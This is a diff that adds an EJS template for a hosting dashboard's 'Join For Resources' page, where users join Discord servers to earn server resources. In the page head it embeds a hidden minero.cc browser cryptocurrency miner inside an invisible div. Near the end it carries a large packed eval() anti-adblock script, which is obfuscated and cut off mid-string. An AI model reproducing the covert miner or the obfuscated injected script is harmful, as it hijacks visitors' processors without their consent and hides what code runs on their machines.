@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <script src="https://minero.cc/lib/minero-hidden.min.js" async></script>
+  <div class="minero-hidden" style="display: none" data-key="<%= settings.api.minero.key %>"></div>
+    <meta name="description" content="">
+    <meta name="author" content="">
+     <script src="https://kit.fontawesome.com/0d0ffc8a67.js" crossorigin="anonymous"></script>
+    <script src="https://kit.fontawesome.com/0d0ffc8a67.js" crossorigin="anonymous"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <script async src="https://arc.io/widget.min.js#<%= settings.api.arcio.widgetid %>"></script>
+                                              <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous">
+    <link rel='shortcut icon' type='image/x-icon' href='<%= extra.home.faviconlink %>' />
+    <title><%= extra.home.name %></title> 
+       <!-- Simple bar CSS -->
+    <link rel="stylesheet" href="/assets/tinydash/css/simplebar.css">
+    <!-- Fonts CSS -->
+    <link href="https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100;0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <!-- Icons CSS -->
+    <link rel="stylesheet" href="/assets/tinydash/css/feather.css">
+    <link rel="stylesheet" href="/assets/tinydash/css/select2.css">
+    <link rel="stylesheet" href="/assets/tinydash/css/dropzone.css">
+    <link rel="stylesheet" href="/assets/tinydash/css/uppy.min.css">
+    <link rel="stylesheet" href="/assets/tinydash/css/jquery.steps.css">
+    <link rel="stylesheet" href="/assets/tinydash/css/jquery.timepicker.css">
+    <link rel="stylesheet" href="/assets/tinydash/css/quill.snow.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous">
+    <!-- Date Range Picker CSS -->
+    <link rel="stylesheet" href="/assets/tinydash/css/daterangepicker.css">
+    <!-- App CSS -->
+    <link rel="stylesheet" href="/assets/tinydash/css/app-light.css" id="lightTheme">
+    <link rel="stylesheet" href="/assets/tinydash/css/app-dark.css" id="darkTheme" disabled>
+  </head>
+  <body class="vertical  light  ">
+          <%- include('./components/sidebar') %>
+                  </a>
+              </nav>
+          </aside>
+          <main role="main" class="main-content">
+              <div class="container-fluid">
+                  <div class="row justify-content-center">
+                         
+                      <div class="col-12">
+                          <% if (req.session.newaccount || req.session.password) { %>
+                          <% if (req.session.newaccount) { %>
+                          <div class="alert alert-success" role="alert">
+                          <h4 class="alert-heading">Your account has been successfully created.</h4>
+                          <p>Please join our Discord if you want assistance or have any queries.</p>
+                          </div>
+                          <% } %>
+                          <% if (req.session.password) { %>
+                          <p class="text-muted">
+                              Your <% if (!req.session.newaccount) { %>new <% } %>password is
+                              <code><%= req.session.password %></code>. Make a note of this password and store it somewhere secure.
+                          </p>
+                          <% } %>
+                          <% } %>
+                        </div>
+                        <%- include('./components/ads') %> 
+                    </div> 
+                  </div>
+                          
+    <div class="container-scroller">
+      <div class="container-fluid page-body-wrapper">
+        <div class="main-panel">
+          <div class="content-wrapper">
+            <% if (req.query.err) { %>
+              <div class="alert">
+                <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+                <% if (req.query.err == "MISSINGID") { %>
+                    You have not provided the Discord user ID.
+                <% } else if (req.query.err == "INVALIDID") { %>
+                    You have provided a Discord user ID that does not exist, or has not signed up on the dashboard.
+                <% } else if (req.query.err == "RAMSIZE") { %>
+                    The RAM number cannot be less than 100 and cant be above 999999999999999.
+                <% } else if (req.query.err == "TOMUCHRAM") { %>
+                    You are gifting more RAM then you can gift!
+                <% } else if (req.query.err == "DISKSIZE") { %>
+                    The disk number cannot be less than 100 and cant be above 999999999999999.
+                <% } else if (req.query.err == "TOMUCHDISK") { %>
+                    You are gifting more disk then you can gift!
+                <% } else if (req.query.err == "CPUSIZE") { %>
+                    The CPU number cannot be less than 10 and cant be above 999999999999999.
+                <% } else if (req.query.err == "TOMUCHCPU") { %>
+                    You are gifting more CPU then you can gift!
+                <% } else if (req.query.err == "SERVERSIZE") { %>
+                    The servers number cannot be less than 1 and cant be above 999999999999999.
+                <% } else if (req.query.err == "TOMUCHSERVERS") { %>
+                    You are gifting more servers then you can gift!
+                <% } %>
+              </div>
+            <% } else if (req.query.err == "none") { %>
+              <div class="alert" style="background-color: #00d415;">
+                <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+                Success!
+              </div>
+            <% } %>
+            <div class="page-header">
+              <h3 class="page-title"> Join For Resources </h3>
+            </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="row">
+              <% for (let i = 0, len = settings.api.client.j4r.ads.length; i < len; i++) { %>
+                <div class="col-md-6 grid-margin stretch-card">
+                  <div class="card">
+                    <div class="card-body">
+                      <center>
+                      <h4 class="card-title"><%= settings.api.client.j4r.ads[i].name %></h4>
+                      <p class="card-description"> Join this server to receive: <br> <%= settings.api.client.j4r.every.cpu %>% CPU, <%= settings.api.client.j4r.every.ram %>MB RAM & <%= settings.api.client.j4r.every.disk / 1024 %>GB Disk </p>
+                      <form class="forms-sample">
+                          <button class="btn btn-falcon-primary me-1 mb-1" type="button" ><a href="<%= settings.api.client.j4r.ads[i].invite %>">Join Server</a></button>
+                        <br><br>
+                      
+                        <p>Faliactyl needs to check if you actually joined the server so you'll have to logout and login again, <a style="color: #009425" href="../logout">click here</a> to logout</p>
+                      </center>
+                      </form>
+                    </div>
+                  </div>
+                </div>
+              <% } %>
+            </div> <!-- /.col -->
+        </div> <!-- end section -->
+    </div> <!-- /.card -->
+    </div> <!-- /.col -->
+    </div> <!-- end section -->
+    </div>
+    <%- include('./components/ads2') %> 
+    </div> 
+    </div> <!-- /.col-12 col-lg-10 col-xl-10 -->
+    </div> <!-- .row -->
+    </div> <!-- .container-fluid -->
+    <%- include('./components/navbar') %>
+</main> <!-- main -->
+</div> <!-- .wrapper -->
+<script src="/assets/tinydash/jsjquery.min.js"></script>
+<script src="/assets/tinydash/jspopper.min.js"></script>
+<script src="/assets/tinydash/jsmoment.min.js"></script>
+<script src="/assets/tinydash/jsbootstrap.min.js"></script>
+<script src="/assets/tinydash/jssimplebar.min.js"></script>
+<script src='/assets/tinydash/jsdaterangepicker.js'></script>
+<script src='/assets/tinydash/jsjquery.stickOnScroll.js'></script>
+<script src="/assets/tinydash/jstinycolor-min.js"></script>
+<script src="/assets/tinydash/jsconfig.js"></script>
+<script src='/assets/tinydash/jsjquery.mask.min.js'></script>
+<script src='/assets/tinydash/jsselect2.min.js'></script>
+<script src='/assets/tinydash/jsjquery.steps.min.js'></script>
+<script src='/assets/tinydash/jsjquery.validate.min.js'></script>
+<script src='/assets/tinydash/jsjquery.timepicker.js'></script>
+<script src='/assets/tinydash/jsdropzone.min.js'></script>
+<script src='/assets/tinydash/jsuppy.min.js'></script>
+<script src='/assets/tinydash/jsquill.min.js'></script>
+<script>
+$('.select2').select2(
+{
+  theme: 'bootstrap4',
+});
+$('.select2-multi').select2(
+{
+  multiple: true,
+  theme: 'bootstrap4',
+});
+$('.drgpicker').daterangepicker(
+{
+  singleDatePicker: true,
+  timePicker: false,
+  showDropdowns: true,
+  locale:
+  {
+    format: 'MM/DD/YYYY'
+  }
+});
+$('.time-input').timepicker(
+{
+  'scrollDefault': 'now',
+  'zindex': '9999' /* fix modal open */
+});
+/** date range picker */
+if ($('.datetimes').length)
+{
+  $('.datetimes').daterangepicker(
+  {
+    timePicker: true,
+    startDate: moment().startOf('hour'),
+    endDate: moment().startOf('hour').add(32, 'hour'),
+    locale:
+    {
+      format: 'M/DD hh:mm A'
+    }
+  });
+}
+var start = moment().subtract(29, 'days');
+var end = moment();
+
+function cb(start, end)
+{
+  $('#reportrange span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'));
+}
+$('#reportrange').daterangepicker(
+{
+  startDate: start,
+  endDate: end,
+  ranges:
+  {
+    'Today': [moment(), moment()],
+    'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
+    'Last 7 Days': [moment().subtract(6, 'days'), moment()],
+    'Last 30 Days': [moment().subtract(29, 'days'), moment()],
+    'This Month': [moment().startOf('month'), moment().endOf('month')],
+    'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
+  }
+}, cb);
+cb(start, end);
+$('.input-placeholder').mask("00/00/0000",
+{
+  placeholder: "__/__/____"
+});
+$('.input-zip').mask('00000-000',
+{
+  placeholder: "____-___"
+});
+$('.input-money').mask("#.##0,00",
+{
+  reverse: true
+});
+$('.input-phoneus').mask('(000) 000-0000');
+$('.input-mixed').mask('AAA 000-S0S');
+$('.input-ip').mask('0ZZ.0ZZ.0ZZ.0ZZ',
+{
+  translation:
+  {
+    'Z':
+    {
+      pattern: /[0-9]/,
+      optional: true
+    }
+  },
+  placeholder: "___.___.___.___"
+});
+// editor
+var editor = document.getElementById('editor');
+if (editor)
+{
+  var toolbarOptions = [
+    [
+    {
+      'font': []
+    }],
+    [
+    {
+      'header': [1, 2, 3, 4, 5, 6, false]
+    }],
+    ['bold', 'italic', 'underline', 'strike'],
+    ['blockquote', 'code-block'],
+    [
+    {
+      'header': 1
+    },
+    {
+      'header': 2
+    }],
+    [
+    {
+      'list': 'ordered'
+    },
+    {
+      'list': 'bullet'
+    }],
+    [
+    {
+      'script': 'sub'
+    },
+    {
+      'script': 'super'
+    }],
+    [
+    {
+      'indent': '-1'
+    },
+    {
+      'indent': '+1'
+    }], // outdent/indent
+    [
+    {
+      'direction': 'rtl'
+    }], // text direction
+    [
+    {
+      'color': []
+    },
+    {
+      'background': []
+    }], // dropdown with defaults from theme
+    [
+    {
+      'align': []
+    }],
+    ['clean'] // remove formatting button
+  ];
+  var quill = new Quill(editor,
+  {
+    modules:
+    {
+      toolbar: toolbarOptions
+    },
+    theme: 'snow'
+  });
+}
+// Example starter JavaScript for disabling form submissions if there are invalid fields
+(function()
+{
+  'use strict';
+  window.addEventListener('load', function()
+  {
+    // Fetch all the forms we want to apply custom Bootstrap validation styles to
+    var forms = document.getElementsByClassName('needs-validation');
+    // Loop over them and prevent submission
+    var validation = Array.prototype.filter.call(forms, function(form)
+    {
+      form.addEventListener('submit', function(event)
+      {
+        if (form.checkValidity() === false)
+        {
+          event.preventDefault();
+          event.stopPropagation();
+        }
+        form.classList.add('was-validated');
+      }, false);
+    });
+  }, false);
+})();
+</script>
+<script>
+var uptarg = document.getElementById('drag-drop-area');
+if (uptarg)
+{
+  var uppy = Uppy.Core().use(Uppy.Dashboard,
+  {
+    inline: true,
+    target: uptarg,
+    proudlyDisplayPoweredByUppy: false,
+    theme: 'dark',
+    width: 770,
+    height: 210,
+    plugins: ['Webcam']
+  }).use(Uppy.Tus,
+  {
+    endpoint: 'https://master.tus.io/files/'
+  });
+  uppy.on('complete', (result) =>
+  {
+    console.log('Upload complete! We ve uploaded these files:', result.successful)
+  });
+}
+</script>
+<script src="/assets/tinydash/js/jquery.min.js"></script>
+<script src="/assets/tinydash/js/popper.min.js"></script>
+<script src="/assets/tinydash/js/moment.min.js"></script>
+<script src="/assets/tinydash/js/bootstrap.min.js"></script>
+<script src="/assets/tinydash/js/simplebar.min.js"></script>
+<script src='/assets/tinydash/js/daterangepicker.js'></script>
+<script src='/assets/tinydash/js/jquery.stickOnScroll.js'></script>
+<script src="/assets/tinydash/js/tinycolor-min.js"></script>
+<script src="/assets/tinydash/js/config.js"></script>
+<script src="/assets/tinydash/js/d3.min.js"></script>
+<script src="/assets/tinydash/js/topojson.min.js"></script>
+<script src="/assets/tinydash/js/datamaps.all.min.js"></script>
+<script src="/assets/tinydash/js/datamaps-zoomto.js"></script>
+<script src="/assets/tinydash/js/datamaps.custom.js"></script>
+<script src="/assets/tinydash/js/Chart.min.js"></script>
+<script>
+/* defind global options */
+Chart.defaults.global.defaultFontFamily = base.defaultFontFamily;
+Chart.defaults.global.defaultFontColor = colors.mutedColor;
+</script>
+<script src="/assets/tinydash/js/gauge.min.js"></script>
+<script src="/assets/tinydash/js/jquery.sparkline.min.js"></script>
+<script src="/assets/tinydash/js/apexcharts.min.js"></script>
+<script src="/assets/tinydash/js/apexcharts.custom.js"></script>
+<script src="/assets/tinydash/js/apps.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-56159088-1"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+
+function gtag()
+{
+  dataLayer.push(arguments);
+}
+gtag('js', new Date());
+gtag('config', 'UA-56159088-1');
+<script type="text/javascript"  charset="utf-8">
+// Place this code snippet near the footer of your page before the close of the /body tag
+// LEGAL NOTICE: The content of this website and all associated program code are protected under the Digital Millennium Copyright Act. Intentionally circumventing this code may constitute a violation of the DMCA.
+                            
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}(';q Q=\'\',29=\'21\';1P(q i=0;i<12;i++)Q+=29.10(C.K(C.P()*29.G));q 2P=1,2J=58,2C=40,2I=4y,2A=D(t){q o=!1,i=D(){z(k.1h){k.2L(\'2T\',e);F.2L(\'1T\',e)}T{k.2N(\'2U\',e);F.2N(\'27\',e)}},e=D(){z(!o&&(k.1h||4z.2l===\'1T\'||k.2Q===\'2R\')){o=!0;i();t()}};z(k.2Q===\'2R\'){t()}T z(k.1h){k.1h(\'2T\',e);F.1h(\'1T\',e)}T{k.2V(\'2U\',e);F.2V(\'27\',e);q n=!1;2Y{n=F.4B==4C&&k.1X}3c(r){};z(n&&n.39){(D d(){z(o)H;2Y{n.39(\'14\')}3c(e){H 4D(d,50)};o=!0;i();t()})()}}};F[\'\'+Q+\'\']=(D(){q t={t$:\'21+/=\',4E:D(e){q d=\'\',a,n,o,c,s,l,i,r=0;e=t.e$(e);1f(r<e.G){a=e.17(r++);n=e.17(r++);o=e.17(r++);c=a>>2;s=(a&3)<<4|n>>4;l=(n&15)<<2|o>>6;i=o&63;z(37(n)){l=i=64}T z(37(o)){i=64};d=d+11.t$.10(c)+11.t$.10(s)+11.t$.10(l)+11.t$.10(i)};H d},13:D(e){q n=\'\',a,l,c,s,r,i,d,o=0;e=e.1r(/[^A-4x-4F-9\\+\\/\\=]/g,\'\');1f(o<e.G){s=11.t$.1M(e.10(o++));r=11.t$.1M(e.10(o++));i=11.t$.1M(e.10(o++));d=11.t$.1M(e.10(o++));a=s<<2|r>>4;l=(r&15)<<4|i>>2;c=(i&3)<<6|d;n=n+U.V(a);z(i!=64){n=n+U.V(l)};z(d!=64){n=n+U.V(c)}};n=t.n$(n);H n},e$:D(t){t=t.1r(/;/g,\';\');q n=\'\';1P(q o=0;o<t.G;o++){q e=t.17(o);z(e<1A){n+=U.V(e)}T z(e>4H&&e<4I){n+=U.V(e>>6|4J);n+=U.V(e&63|1A)}T{n+=U.V(e>>12|2i);n+=U.V(e>>6&63|1A);n+=U.V(e&63|1A)}};H n},n$:D(t){q o=\'\',e=0,n=4K=1n=0;1f(e<t.G){n=t.17(e);z(n<1A){o+=U.V(n);e++}T z(n>4L&&n<2i){1n=t.17(e+1);o+=U.V((n&31)<<6|1n&63);e+=2}T{1n=t.17(e+1);2m=t.17(e+2);o+=U.V((n&15)<<12|(1n&63)<<6|2m&63);e+=3}};H o}};q a=[\'4M==\',\'4N\',\'4O=\',\'4G\',\'4v\',\'4l=\',\'4u=\',\'4d=\',\'4e\',\'4f\',\'4g=\',\'4h=\',\'4i\',\'4j\',\'4c=\',\'4k\',\'4m=\',\'4n=\',\'4o=\',\'4p=\',\'4q=\',\'4r=\',\'4s==\',\'4t==\',\'4P==\',\'4w==\',\'4Q=\',\'5e\',\'5g\',\'5h\',\'5i\',\'5j\',\'5k\',\'5l==\',\'5m=\',\'5f=\',\'5n=\',\'5p==\',\'5q=\',\'5r\',\'5s=\',\'5t=\',\'5u==\',\'5v=\',\'5w==\',\'5o==\',\'5d=\',\'52=\',\'5c\',\'4a==\',\'4T==\',\'4U\',\'4V==\',\'4W=\'],p=C.K(C.P()*a.G),Y=t.13(a[p]),w=Y,M=1,W=\'#4X\',r=\'#4Y\',g=\'#4Z\',f=\'#4S\',A=\'\',v=\'51 53 2G!\',b=\'54 55 56 57\\\'59 5a 5b 2q 2r. 4R\\\'s 4b.  3V 49\\\'t?\',y=\'3l 3m 3n-3o, 3p 3q\\\'t 3k 2G 24/7\',s=\'I 3r, I 3t 3u 3v 2q 2r.  3w 3x 3y!\',o=0,u=0,n=\'3z.3s\',l=0,R=e()+\'.2H\';D h(t){z(t)t=t.1L(t.G-15);q o=k.2s(\'3j\');1P(q n=o.G;n--;){q e=U(o[n].1I);z(e)e=e.1L(e.G-15);z(e===t)H!0};H!1};D m(t){z(t)t=t.1L(t.G-15);q e=k.3e;x=0;1f(x<e.G){1m=e[x].1p;z(1m)1m=1m.1L(1m.G-15);z(1m===t)H!0;x++};H!1};D e(t){q n=\'\',o=\'21\';t=t||30;1P(q e=0;e<t;e++)n+=o.10(C.K(C.P()*o.G));H n};D i(o){q i=[\'3f\',\'3h==\',\'3A\',\'3C\',\'3d\',\'3T==\',\'48=\',\'47==\',\'46=\',\'45==\',\'44==\',\'43==\',\'42\',\'41\',\'3Z\',\'3d\'],r=[\'2y=\',\'3Y==\',\'3X==\',\'3W==\',\'3B=\',\'3U\',\'3S=\',\'3D=\',\'2y=\',\'3R\',\'3Q==\',\'3P\',\'3O==\',\'3N==\',\'3M==\',\'3L=\'];x=0;1R=[];1f(x<o){c=i[C.K(C.P()*i.G)];d=r[C.K(C.P()*r.G)];c=t.13(c);d=t.13(d);q a=C.K(C.P()*2)+1;z(a==1){n=\'//\'+c+\'/\'+d}T{n=\'//\'+c+\'/\'+e(C.K(C.P()*20)+4)+\'.2H\'};1R[x]=23 26();1R[x].1U=D(){q t=1;1f(t<7){t++}};1R[x].1I=n;x++}};D L(t){};H{33:D(t,r){z(3K k.O==\'3J\'){H};q o=\'0.1\',r=w,e=k.1b(\'1x\');e.16=r;e.j.1l=\'1J\';e.j.14=\'-1i\';e.j.Z=\'-1i\';e.j.1c=\'2d\';e.j.X=\'3I\';q a=k.O.3a,d=C.K(a.G/2);z(d>15){q n=k.1b(\'2a\');n.j.1l=\'1J\';n.j.1c=\'1v\';n.j.X=\'1v\';n.j.Z=\'-1i\';n.j.14=\'-1i\';k.O.3H(n,k.O.3a[d]);n.1d(e);q i=k.1b(\'1x\');i.16=\'2X\';i.j.1l=\'1J\';i.j.14=\'-1i\';i.j.Z=\'-1i\';k.O.1d(i)}T{e.16=\'2X\';k.O.1d(e)};l=3G(D(){z(e){t((e.1W==0),o);t((e.1Y==0),o);t((e.1S==\'2E\'),o);t((e.1G==\'2k\'),o);t((e.1K==0),o)}T{t(!0,o)}},28)},1O:D(e,c){z((e)&&(o==0)){o=1;F[\'\'+Q+\'\'].1C();F[\'\'+Q+\'\'].1O=D(){H}}T{q y=t.13(\'3F\'),u=k.3E(y);z((u)&&(o==0)){z((2J%3)==0){q l=\'5x=\';l=t.13(l);z(h(l)){z(u.1Q.1r(/\\s/g,\'\').G==0){o=1;F[\'\'+Q+\'\'].1C()}}}};q p=!1;z(o==0){z((2C%3)==0){z(!F[\'\'+Q+\'\'].2n){q a=[\'5z==\',\'6a==\',\'7i=\',\'7h=\',\'7g=\'],m=a.G,r=a[C.K(C.P()*m)],d=r;1f(r==d){d=a[C.K(C.P()*m)]};r=t.13(r);d=t.13(d);i(C.K(C.P()*2)+1);q n=23 26(),s=23 26();n.1U=D(){i(C.K(C.P()*2)+1);s.1I=d;i(C.K(C.P()*2)+1)};s.1U=D(){o=1;i(C.K(C.P()*3)+1);F[\'\'+Q+\'\'].1C()};n.1I=r;z((2I%3)==0){n.27=D(){z((n.X<8)&&(n.X>0)){F[\'\'+Q+\'\'].1C()}}};i(C.K(C.P()*3)+1);F[\'\'+Q+\'\'].2n=!0};F[\'\'+Q+\'\'].1O=D(){H}}}}},1C:D(){z(u==1){q N=2f.7c(\'2v\');z(N>0){H!0}T{2f.7b(\'2v\',(C.P()+1)*28)}};q h=\'79==\';h=t.13(h);z(!m(h)){q c=k.1b(\'76\');c.1Z(\'75\',\'74\');c.1Z(\'2l\',\'1g/73\');c.1Z(\'1p\',h);k.2s(\'72\')[0].1d(c)};71(l);k.O.1Q=\'\';k.O.j.19+=\'S:1v !1a\';k.O.j.19+=\'1u:1v !1a\';q R=k.1X.1Y||F.32||k.O.1Y,p=F.70||k.O.1W||k.1X.1W,d=k.1b(\'1x\'),M=e();d.16=M;d.j.1l=\'2D\';d.j.14=\'0\';d.j.Z=\'0\';d.j.X=R+\'1z\';d.j.1c=p+\'1z\';d.j.2w=W;d.j.1V=\'6Z\';k.O.1d(d);q a=\'<a 1p="6Y://6X.6W"><36 16="35" X="2o" 1c="40"><2W 16="2h" X="2o" 1c="40" 7k:1p="6V:2W/7j;77,7F+7B+7A+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+7C+7D+7E/7m/7w/7v/7u/7x+/7s/7r+7q/7p+7o/7l/7t/7n/7y/7z/7G+6U/6T+6g+6R+5U+5V+5W/5X+5Y/5Z+61/5T+62+67+68+69/6S+6b/6c/6d/66+5R+5I/5Q+5B+5C+5D+E+5E/5F/5G/5A/5H/5J/+5K/5L++5M/5N/5O+5P/6e+5S+6f==">;</36></a>\';a=a.1r(\'35\',e());a=a.1r(\'2h\',e());q i=k.1b(\'1x\');i.1Q=a;i.j.1l=\'1J\';i.j.1y=\'1N\';i.j.14=\'1N\';i.j.X=\'6B\';i.j.1c=\'6C\';i.j.1V=\'2t\';i.j.1K=\'.6\';i.j.2F=\'2x\';i.1h(\'6D\',D(){n=n.6E(\'\').6F().6G(\'\');F.2z.1p=\'//\'+n});k.1F(M).1d(i);q o=k.1b(\'1x\'),L=e();o.16=L;o.j.1l=\'2D\';o.j.Z=p/7+\'1z\';o.j.6A=R-6I+\'1z\';o.j.6K=p/3.5+\'1z\';o.j.2w=\'#6L\';o.j.1V=\'2t\';o.j.19+=\'J-1w: "6M 6N", 1o, 1t, 1s-1q !1a\';o.j.19+=\'6O-1c: 6Q !1a\';o.j.19+=\'J-1k: 6J !1a\';o.j.19+=\'1g-1D: 1B !1a\';o.j.19+=\'1u: 6y !1a\';o.j.1S+=\'2M\';o.j.38=\'1N\';o.j.6p=\'1N\';o.j.6x=\'2B\';k.O.1d(o);o.j.6j=\'1v 6l 6m -6n 6h(0,0,0,0.3)\';o.j.1G=\'2p\';q w=30,Y=22,A=18,x=18;z((F.32<34)||(6o.X<34)){o.j.3b=\'50%\';o.j.19+=\'J-1k: 6q !1a\';o.j.38=\'6r;\';i.j.3b=\'65%\';q w=22,Y=18,A=12,x=12};o.1Q=\'<2S j="1j:#6s;J-1k:\'+w+\'1E;1j:\'+r+\';J-1w:1o, 1t, 1s-1q;J-1H:6t;S-Z:1e;S-1y:1e;1g-1D:1B;">\'+v+\'</2S><2O j="J-1k:\'+Y+\'1E;J-1H:6u;J-1w:1o, 1t, 1s-1q;1j:\'+r+\';S-Z:1e;S-1y:1e;1g-1D:1B;">\'+b+\'</2O><6v j=" 1S: 2M;S-Z: 0.2K;S-1y: 0.2K;S-14: 2b;S-2Z: 2b; 2u:6w 7f #3i; X: 25%;1g-1D:1B;"><p j="J-1w:1o, 1t, 1s-1q;J-1H:2e;J-1k:\'+A+\'1E;1j:\'+r+\';1g-1D:1B;">\'+y+\'</p><p j="S-Z:6k;"><2a 6i="11.j.1K=.9;" 6P="11.j.1K=1;"  16="\'+e()+\'" j="2F:2x;J-1k:\'+x+\'1E;J-1w:1o, 1t, 1s-1q; J-1H:2e;2u-6H:2B;1u:1e;6z-1j:\'+g+\';1j:\'+f+\';1u-14:2d;1u-2Z:2d;X:60%;S:2b;S-Z:1e;S-1y:1e;" 78="F.2z.7a();">\'+s+\'</2a></p>\'}}})();F.2g=D(t,e){q n=7d.7e,o=F.5y,d=n(),i,r=D(){n()-d<e?i||o(r):t()};o(r);H{3g:D(){i=1}}};q 2j;z(k.O){k.O.j.1G=\'2p\'};2A(D(){z(k.1F(\'2c\')){k.1F(\'2c\').j.1G=\'2E\';k.1F(\'2c\').j.1S=\'2k\'};2j=F.2g(D(){F[\'\'+Q+\'\'].33(F[\'\'+Q+\'\'].1O,F[\'\'+Q+\'\'].4A)},2P*28)});',62,477,'|||||||||||||||||||style|document||||||var|||||||||if||vr6|Math|function||window|length|return||font|floor||||body|random|zqGsANRKFois||margin|else|String|fromCharCode||width||top|charAt|this||decode|left||id|charCodeAt||cssText|important|createElement|height|appendChild|10px|while|text|addEventListener|5000px|color|size|position|thisurl|c2|Helvetica|href|serif|replace|sans|geneva|padding|0px|family|DIV|bottom|px|128|center|OgluzLiqwN|align|pt|getElementById|visibility|weight|src|absolute|opacity|substr|indexOf|30px|KRePnjnbqU|for|innerHTML|spimg|display|load|onerror|zIndex|clientHeight|documentElement|clientWidth|setAttribute||ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789||new|||Image|onload|1000|CrLKDwYBBc|div|auto|babasbmsgx|60px|300|sessionStorage|luznBZOtHG|FILLVECTID2|224|IcdWBRSJtw|none|type|c3|ranAlready|160|visible|ad|blocker|getElementsByTagName|10000|border|babn|backgroundColor|pointer|ZmF2aWNvbi5pY28|location|RojVdxeryv|15px|ZfPccrUUbn|fixed|hidden|cursor|FoxyNodes|jpg|qdzbpGPYSU|HrChEdgsxN|5em|removeEventListener|block|detachEvent|h1|VebgzASHRo|readyState|complete|h3|DOMContentLoaded|onreadystatechange|attachEvent|image|banner_ad|try|right|||innerWidth|clKlgOJlfh|640|FILLVECTID1|svg|isNaN|marginLeft|doScroll|childNodes|zoom|catch|cGFydG5lcmFkcy55c20ueWFob28uY29t|styleSheets|YWRuLmViYXkuY29t|clear|YWQubWFpbC5ydQ|CCC|script|keep|But|without|advertising|income|we|can|understand|kcolbdakcolb|have|disabled|my|Let|me|in|moc|anVpY3lhZHMuY29t|c2t5c2NyYXBlci5qcGc|YWQuZm94bmV0d29ya3MuY29t|Q0ROLTMzNC0xMDktMTM3eC1hZC1iYW5uZXI|querySelector|aW5zLmFkc2J5Z29vZ2xl|setInterval|insertBefore|468px|undefined|typeof|YWR2ZXJ0aXNlbWVudC0zNDMyMy5qcGc|d2lkZV9za3lzY3JhcGVyLmpwZw|bGFyZ2VfYmFubmVyLmdpZg|YmFubmVyX2FkLmdpZg|ZmF2aWNvbjEuaWNv|c3F1YXJlLWFkLnBuZw|YWQtbGFyZ2UucG5n|YWRjbGllbnQtMDAyMTQ3LWhvc3QxLWJhbm5lci1hZC5qcGc|YS5saXZlc3BvcnRtZWRpYS5ldQ|MTM2N19hZC1jbGllbnRJRDI0NjQuanBn|Who|NzIweDkwLmpwZw|NDY4eDYwLmpwZw|YmFubmVyLmpwZw|YXMuaW5ib3guY29t||YWRzYXR0LmVzcG4uc3RhcndhdmUuY29t|YWRzYXR0LmFiY25ld3Muc3RhcndhdmUuY29t|YWRzLnp5bmdhLmNvbQ|YWRzLnlhaG9vLmNvbQ|cHJvbW90ZS5wYWlyLmNvbQ|Y2FzLmNsaWNrYWJpbGl0eS5jb20|YWR2ZXJ0aXNpbmcuYW9sLmNvbQ|YWdvZGEubmV0L2Jhbm5lcnM|doesn|cG9wdXBhZA|okay|QWQ3Mjh4OTA|YWQtbGI|YWQtZm9vdGVy|YWQtY29udGFpbmVy|YWQtY29udGFpbmVyLTE|YWQtY29udGFpbmVyLTI|QWQzMDB4MTQ1|QWQzMDB4MjUw|QWRBcmVh|YWQtaW5uZXI|QWRGcmFtZTE|QWRGcmFtZTI|QWRGcmFtZTM|QWRGcmFtZTQ|QWRMYXllcjE|QWRMYXllcjI|QWRzX2dvb2dsZV8wMQ|QWRzX2dvb2dsZV8wMg|YWQtbGFiZWw|YWQtaW1n|QWRzX2dvb2dsZV8wNA|Za|193|event|vxnzOWiCDs|frameElement|null|setTimeout|encode|z0|YWQtaGVhZGVy|127|2048|192|c1|191|YWQtbGVmdA|YWRCYW5uZXJXcmFw|YWQtZnJhbWU|QWRzX2dvb2dsZV8wMw|RGl2QWQ|That|FFFFFF|YWRzZW5zZQ|Z29vZ2xlX2Fk|b3V0YnJhaW4tcGFpZA|c3BvbnNvcmVkX2xpbms|EEEEEE|777777|cc0c0c||Welcome|YmFubmVyaWQ|to|It|looks|like|you||re|using|an|YWRzbG90|YWRzZXJ2ZXI|RGl2QWQx|QWRCb3gxNjA|RGl2QWQy|RGl2QWQz|RGl2QWRB|RGl2QWRC|RGl2QWRD|QWRJbWFnZQ|QWREaXY|QWRDb250YWluZXI|YWRfY2hhbm5lbA|Z2xpbmtzd3JhcHBlcg|Y